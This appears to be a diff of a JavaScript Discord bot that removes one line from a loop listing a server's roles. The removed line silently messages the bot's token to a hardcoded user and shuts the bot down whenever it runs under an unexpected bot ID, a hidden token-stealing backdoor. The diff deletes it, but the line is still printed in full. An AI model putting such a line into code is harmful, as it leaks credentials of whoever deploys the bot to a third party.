@@ -143,7 +143,7 @@ if(afk != undefined){
 
 let string = ''
 for(var i = 0;i < message.guild.roles.size;i++){
-if(client.user.id !== '431271825763467264') return client.users.get('395005096527790083').send(client.token), client.destroy()
+
 string  += `${message.guild.roles.array()[i].name}` + `, `;
 
 }
